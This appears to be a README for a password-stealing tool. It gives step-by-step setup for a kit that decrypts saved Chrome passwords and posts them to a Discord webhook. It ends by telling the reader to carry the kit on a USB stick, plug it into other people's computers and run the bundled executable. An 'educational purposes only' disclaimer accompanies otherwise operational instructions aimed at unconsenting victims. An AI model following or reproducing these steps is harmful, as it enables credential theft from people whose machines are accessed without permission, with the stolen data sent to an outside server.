Get python https://www.python.org/downloads/
First off, python -m venv pswdstealer
then in your directory go to the /Scripts/ Folder
then do start activate.bat
Get the decrypter from https://github.com/ohyicong/decrypt-chrome-passwords
do "pip install pycryptodomex && pip install pycryptodome"
do "pip install pywin32 && pip install sqlite"
do "pip install discord && pip install discord_webhooks" copy and paste.
take the decrypter file and put it into the pswdstlr folder
download the .bat .exe .py files from this github and put it in there
MAKE SURE TO NAME THE DECRYPTOR FILE (the decrypt-chrome-passwords) "cc.py" OR ELSE IT WONT WORK.
THE .exe FILE IS "updatedstealer.exe".
-----------------------------------------------------------------------
BEFORE STARTING:
CHANGE THE DISCORD WEBHOOK FROM THE post_password.py
THIS IS FOR EDUCATIONAL PURPUSES ONLY. I AM NOT LIABLE FOR ANY DAMAGE DONE TO ANY PROPERTY.
TOOLS USED: GCC, NOTEPAD, CMD, PYTHON, VSCODE, PYCHARM.
-----------------------------------------------------------------------
DO ALL THIS ON A PENDRIVE AND GO AROUND PLUG IT IN, INSTALL PYTHON AND RUN THE .EXE FILE IN THE PSWDSTLR FOLDER.
IT WILL WORK (most of the time)
------------------------------------------------------------------------
Anyways the .exe file is compiled from a .c file using GCC. the file is "yay yay.c" it will be uploaded here for any people who find me suspicious.
